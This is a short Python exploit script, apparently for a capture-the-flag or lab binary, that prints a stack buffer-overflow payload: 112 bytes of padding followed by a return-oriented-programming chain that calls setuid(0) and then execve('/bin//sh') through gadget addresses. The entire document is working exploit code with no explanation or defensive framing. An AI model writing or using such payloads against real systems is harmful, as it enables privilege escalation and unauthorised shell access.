from struct import pack
import sys

p = b""
p += pack("<I", 0x0807299B)  # pop edx ; ret
p += pack("<I", 0x080DE060)  # @ .data
p += pack("<I", 0x080AC7B6)  # pop eax ; ret
p += b"/bin"
p += pack("<I", 0x08056E15)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x0807299B)  # pop edx ; ret
p += pack("<I", 0x080DE064)  # @ .data + 4
p += pack("<I", 0x080AC7B6)  # pop eax ; ret
p += b"//sh"
p += pack("<I", 0x08056E15)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x0807299B)  # pop edx ; ret
p += pack("<I", 0x080DE068)  # @ .data + 8
p += pack("<I", 0x080563D0)  # xor eax, eax ; ret
p += pack("<I", 0x08056E15)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x080481D1)  # pop ebx ; ret
p += pack("<I", 0x080DE060)  # @ .data
p += pack("<I", 0x080729C2)  # pop ecx ; pop ebx ; ret
p += pack("<I", 0x080DE068)  # @ .data + 8
p += pack("<I", 0x080DE060)  # padding without overwrite ebx
p += pack("<I", 0x0807299B)  # pop edx ; ret
p += pack("<I", 0x080DE068)  # @ .data + 8
p += pack("<I", 0x080563D0)  # xor eax, eax ; ret
p += pack("<I", 0x0805E8AD) * 11  # inc eax ; ret
p += pack("<I", 0x08049893)  # int 0x80

pop_ebx = 0x080481D1.to_bytes(4, "little")
max_32 = 0xFFFFFFFF.to_bytes(4, "little")
inc_ebx = 0x0805E27B.to_bytes(4, "little")
xor_eax = 0x080563D0.to_bytes(4, "little")
inc_eax = 0x0805E8AD.to_bytes(4, "little")
int_80 = 0x080732D0.to_bytes(4, "little")

sys.stdout.buffer.write(
    b"A" * 112 + pop_ebx + max_32 + inc_ebx + xor_eax + inc_eax * 23 + int_80 + p
)
